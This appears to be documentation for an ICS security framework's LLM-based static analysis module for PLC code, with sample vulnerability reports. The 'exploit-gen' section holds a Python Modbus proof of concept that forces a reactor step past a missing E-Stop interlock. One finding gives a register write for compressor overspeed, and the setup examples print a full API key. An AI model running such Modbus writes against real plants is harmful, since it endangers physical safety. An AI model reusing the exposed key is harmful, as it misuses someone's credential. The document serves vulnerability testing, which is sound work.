# SAST / LLM Analysis

IXF includes an offline Static Application Security Testing (SAST) module powered by LLMs. It analyzes PLC/RTU source code for security vulnerabilities, unsafe setpoints, authentication gaps, and process-specific attack vectors — without uploading code to external services unintentionally.

---

## Supported LLM Providers

| Provider | Model | Env Variable |
|----------|-------|--------------|
| OpenAI | `gpt-4o` | `OPENAI_API_KEY` |
| Anthropic | `claude-3-5-sonnet-20241022` | `ANTHROPIC_API_KEY` |
| Google Gemini | `gemini-2.5-flash` | `GOOGLE_AI_STUDIO_API_KEY` |
| DeepSeek | `deepseek-chat` | `DEEPSEEK_API_KEY` |
| Grok (xAI) | `grok-2-latest` | `XAI_API_KEY` |

**Provider selection priority:** OpenAI (if configured) → first configured provider in the order above.

---

## Configuring an LLM Key

### Option 1: Environment variable (recommended — key never enters IXF)

```bash
export GOOGLE_AI_STUDIO_API_KEY=AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
export OPENAI_API_KEY=sk-svcacct-...
ixf
```

### Option 2: Shell command (in-session only, never written to disk)

```
ixf > llm-key gemini AIzaSyBGaoio5aKf3rWNFjpqc8trP4EJPyABYH8
[+] LLM key configured: provider=gemini len=39

ixf > llm-key openai sk-svcacct-...
[+] LLM key configured: provider=openai len=82
```

### Check current status

```
ixf > llm-status

  LLM Providers
  ─────────────────────────────────────
  Provider    Status
  openai      not configured
  anthropic   not configured
  gemini      configured
  deepseek    not configured
  grok        not configured
  ─────────────────────────────────────
  Active: gemini
```

---

## Running SAST Analysis

```
ixf > sast <path> [--mode <mode>] [--diff <other_file>]
```

| Argument | Type | Required | Default | Description |
|----------|------|----------|---------|-------------|
| path | string | yes | — | PLC source file or project directory |
| `--mode` | string | no | `sast` | Analysis mode (see below) |
| `--diff` | string | no | — | Second file path for `diff` mode |

---

## Analysis Modes

### `sast` (Default) — Full Vulnerability Analysis

Analyzes the code for all OT-specific vulnerability categories:

```
ixf > sast /opt/plc_projects/water_treatment/ --mode sast
[*] Target: water_treatment/ (5 files, 245 lines)
[*] Languages: ST (3), FBD (1), IL (1)
[*] Provider: gemini | Sanitized: 2 credential(s), 1 public IP
[*] Sending 9.7 KB to LLM (sanitized)...

  SAST VULNERABILITY ANALYSIS REPORT
  ═══════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Unvalidated Compressor Speed Setpoint
    Location: compressor.il, FC3, line 15
    Type: Input Validation Flaw / Unsafe Setpoint
    Description: MW100 (Modbus HR[50]) written directly to motor speed
                 without range validation. Comment: "Attacker can write
                 65535 RPM to HR[50]"
    Attack Vector: Modbus FC16 write to HR[50] — no authentication
    Physical Impact: Motor overspeed, catastrophic mechanical failure,
                     explosion risk due to gas compressor runaway
    MITRE ATT&CK for ICS: T0802, T0836, T0860
    Exploitation: modbus_write_register(unit=1, address=50, value=65535)
    Remediation: Validate MW100 in [MIN_RPM, MAX_SAFE_RPM] before use.
                 Hardware governor as independent safety layer.

  FINDING [SEVERITY: CRITICAL]: PID Parameters Writable Without Auth
    Location: pump_station.fbd, PID_PressureControl
    Description: Kp, Ki, Kd modifiable via OPC UA anonymous session
    Attack Vector: OPC UA write to Kp, Ki, Kd nodes (port 4840)
    Physical Impact: PID instability → overpressure → pipe rupture
    MITRE: T0807, T0836, T0882
    Remediation: Enable OPC UA SecurityMode=SignAndEncrypt; require
                 authentication for all write operations.

  ... [3 more findings]
```

---

### `reverse` — Reverse Engineering Mode

For binary/compiled PLC firmware:

```
ixf > sast /opt/plc_firmware/controller_v2.bin --mode reverse
[*] Binary file: controller_v2.bin (128 KB)
[*] Extracting strings and hex dump...
[*] Sending to LLM for reverse engineering...

  REVERSE ENGINEERING REPORT
  ═══════════════════════════════════════════════════════════════

  Identified: Siemens S7-300 compiled program block
  Strings found: 12 interesting strings
    - "PASSWORD=admin123" at offset 0x2A80
    - "192.168.100.1" at offset 0x3C20 (internal IP)
    - "EMERGENCY_BYPASS" at offset 0x4100
  ...
```

---

### `diff` — Change Detection

Compare two versions of the same PLC program to identify unauthorized modifications:

```
ixf > sast /opt/plc/v2.3_original.st --mode diff --diff /opt/plc/v2.3_modified.st
[*] Comparing: v2.3_original.st vs v2.3_modified.st
[*] Provider: gemini
[*] Sending diff to LLM...

  DIFFERENTIAL ANALYSIS REPORT
  ═══════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Safety Limit Removed
    Original:  SP_TEMP_TRIP := 280.0;  (* Safe per safety spec *)
    Modified:  SP_TEMP_TRIP := 450.0;  (* Raised without documentation *)
    Impact: Temperature trip setpoint raised 60% above safe spec
    Technique: TRITON-style safety system manipulation (T0816)
    Recommendation: Revert immediately; investigate who made this change.
```

---

### `exploit-gen` — Exploit Generation

Generate a proof-of-concept exploit based on SAST findings:

```
ixf > sast /opt/plc/reactor_batch.sfc --mode exploit-gen
[*] Analyzing for exploitable patterns...
[*] Generating PoC exploit...

  EXPLOIT GENERATION REPORT
  ═══════════════════════════════════════════════════════════════

  Target: SFC Step S3 (StartReaction) — missing E-Stop interlock
  Exploit vector: Force SFC step directly via Modbus coil write

  Generated Python PoC:
    import socket, struct
    # Modbus FC05: Write Single Coil — force SFC step
    payload = struct.pack(">HHHBBHBH", 1, 0, 0, 6, 1, 0x05, 0x00, 0x10, 0xFF00)
    s = socket.socket(); s.connect(("TARGET", 502))
    s.send(payload)
    response = s.recv(12)
    print("SFC Step forced:", response.hex())
```

---

## Supported PLC Languages

| Language | File Extensions |
|----------|----------------|
| Structured Text (ST) | `.st`, `.iecst`, `.scl` |
| Ladder Diagram (LD) | `.lad`, `.ld`, `.ldr` |
| Function Block Diagram (FBD) | `.fbd` |
| Instruction List (IL) | `.il`, `.awl`, `.stl` |
| Sequential Function Chart (SFC) | `.sfc` |
| Siemens SCL/AWL | `.scl`, `.awl`, `.stl` |
| Rockwell Studio 5000 (L5X) | `.l5x` |
| ABB Automation Builder | `.ap1`, `.ap15` |
| CODESYS | `.pro`, `.project`, `.pou`, `.gvl` |
| Siemens TIA Portal | `.db`, `.fb`, `.fc`, `.ob` |
| Generic XML/JSON | `.xml`, `.json` |

---

## Sanitization Before LLM Submission

IXF applies multiple sanitization layers before sending any code to the LLM provider. This protects sensitive operational data while still enabling thorough security analysis.

### What Gets Redacted

| Data Type | Replaced With | Example |
|-----------|---------------|---------|
| Public IP addresses | `[IP_REDACTED]` | `8.8.8.8` → `[IP_REDACTED]` |
| Private IPs | **Preserved** (needed for topology analysis) | `192.168.1.1` kept |
| Credentials/passwords | `[CREDENTIAL_REDACTED]` | `password := 'admin123'` → `password := '[CREDENTIAL_REDACTED]'` |
| External hostnames | `[HOST_REDACTED]` | `plc.company.com` → `[HOST_REDACTED]` |
| Long hex blobs (>32 chars) | `[HEXBLOB_REDACTED]` | Binary keys, firmware payloads |
| Long Base64 blobs (>40 chars) | `[B64BLOB_REDACTED]` | Certificates, encoded payloads |
| Lines >300 chars | Line truncated with `[LINE_TRUNCATED]` | Binary data rows |

### Token Budget

The payload sent to the LLM is capped at **32,000 characters** (approximately 8,000 tokens). Files are proportionally truncated if the project exceeds this limit. A per-file budget ensures each file gets representation.

### Audit Trail

The sanitization report is shown before analysis:

```
[*] Files: 5 | Lines: 245
[*] Languages: ST (3), FBD (1), IL (1)
[*] Sanitized: 2 credential(s), 1 public IP — private IPs preserved
[*] Payload: 9,788 chars (sanitized) sent to gemini
```

---

## SAST Analysis Categories

The LLM is instructed to analyze 8 security categories specific to OT/ICS:

1. **Setpoints and process parameters** — unsafe limits, hardcoded values, missing range checks
2. **Safety system logic** — E-Stop, STO/SOS/SLS, alarm bypass, watchdog issues
3. **Authentication and access control** — bypass flags, hardcoded credentials, maintenance overrides
4. **Input validation** — Modbus/OPC/HMI inputs used without bounds checking
5. **Race conditions and timing** — concurrent access to shared variables, async issues
6. **Network/communication** — cleartext protocols, unauthenticated calls, MQTT/OPC without security
7. **Logic flaws and attack scenarios** — step-by-step exploitable patterns
8. **Finding summary** — structured CRITICAL/HIGH/MEDIUM/LOW findings

Each finding includes:
- Exact location (file, function, line)
- Physical consequence in the plant
- Attack vector (specific command/tool)
- MITRE ATT&CK for ICS technique IDs
- Concrete remediation steps

---

## Example SAST Examples

IXF ships with 17 realistic PLC examples in `industrialxpl/resources/sast_examples/`:

| File | Process | Key Vulnerabilities |
|------|---------|-------------------|
| `nuclear_reactor_cooling.st` | Nuclear cooling | SCRAM bypass via Maintenance_Mode |
| `water_treatment_chemical_dosing.st` | Water treatment | Chlorine setpoint 4000 mg/L |
| `gas_pipeline_pressure_control.st` | Gas pipeline | ESD + SIS both bypassed |
| `power_grid_substation.st` | Power grid | DNP3 without SAv5, GOOSE no HMAC |
| `oil_refinery_process.st` | Refinery CDU | Fired heater above design limits |
| `wind_farm_scada.st` | Wind farm | MQTT no auth — shutdown 250MW |
| `GRFICSv3_chemical.st` | Chemical plant | Modbus setpoints without validation |

To analyze an example:

```
ixf > llm-key gemini AIzaSy...
ixf > sast industrialxpl/resources/sast_examples/water_treatment_chemical_dosing.st
```

---

*Previous: [MITRE ATT&CK for ICS](06-mitre-attack-ics.md) | Next: [Protocols & Vendors](08-protocols-vendors.md)*
